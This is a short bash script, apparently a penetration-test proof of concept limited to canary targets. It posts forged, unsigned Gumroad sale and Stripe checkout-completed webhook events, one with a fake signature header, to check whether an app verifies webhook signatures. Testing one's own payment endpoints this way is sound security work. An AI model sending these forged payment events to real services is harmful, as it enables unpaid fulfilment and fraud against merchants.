#!/bin/bash
# Webhook Replay Payload — T1203 (PoC only)
# ROE: Fork/canary — proof not destruction

TARGET="${1:-http://localhost:3000}"

echo "=== Phase 2d: Webhook Replay Probes ==="
echo "Target: $TARGET"
echo ""

# Test 1: Gumroad webhook — no signature
echo "--- Test 1: Gumroad unsigned webhook ---"
curl -s -X POST "$TARGET/api/gumroad/webhook" \
  -H 'Content-Type: application/json' \
  -d '{
    "sale_id": "canary_test_001",
    "event_type": "sale",
    "email": "canary@test.local",
    "product_name": "Canary Test",
    "price": 1.00
  }' | python3 -m json.tool 2>/dev/null || echo "(raw output)"
echo ""

# Test 2: Gumroad webhook — alternative signature header
echo "--- Test 2: Gumroad with x-gumroad-webhook-signature ---"
curl -s -X POST "$TARGET/api/gumroad/webhook" \
  -H 'Content-Type: application/json' \
  -H 'x-gumroad-webhook-signature: canary_test' \
  -d '{"sale_id":"canary_test_002","event_type":"sale","price":1}' | python3 -m json.tool 2>/dev/null || echo "(raw output)"
echo ""

# Test 3: Stripe unsigned event
echo "--- Test 3: Stripe unsigned webhook ---"
curl -s -X POST "$TARGET/api/stripe/webhook" \
  -H 'Content-Type: application/json' \
  -d '{
    "id": "evt_canary_001",
    "type": "checkout.session.completed",
    "data": {"object": {"id": "cs_canary_001"}}
  }' | python3 -m json.tool 2>/dev/null || echo "(raw output)"
echo ""

echo "=== Webhook probe complete ==="
